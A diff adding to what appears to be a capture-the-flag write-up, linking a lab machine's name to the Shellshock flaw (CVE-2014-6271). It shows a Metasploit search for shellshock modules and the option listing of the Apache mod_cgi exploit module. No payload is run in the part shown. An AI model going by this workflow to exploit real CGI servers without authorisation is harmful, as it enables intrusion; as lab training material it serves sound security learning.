@@ -67,4 +67,57 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
+Other gobuster commands run taking as base /cgi-bin didn't bring much.
+
+Duckduckdicking a bit noticed that the machine's name refers to the Shell Shock vulnerability (CVE-2014-6271), which is related to the `/cgi-bin` directory.
+
+Search on Metasploit:
+```
+msf > search shellshock
+
+Matching Modules
+================
+
+   Name                                               Disclosure Date  Rank       Description
+   ----                                               ---------------  ----       -----------
+   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     DHCP Client Bash Environment Variable Code Injection (Shellshock)
+   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Advantech Switch Bash Environment Variable Code Injection (Shellshock)
+   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  IPFire Bash Environment Variable Injection (Shellshock)
+   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
+   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  CUPS Filter Bash Environment Variable Code Injection (Shellshock)
+   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Legend Perl IRC Bot Remote Code Execution
+   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
+   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  Dhclient Bash Environment Variable Injection (Shellshock)
+   exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     Qmail SMTP Bash Environment Variable Injection (Shellshock)
+```
+
+
+```
+msf exploit(linux/http/ipfire_bashbug_exec) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                            yes       The target address
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+```
 
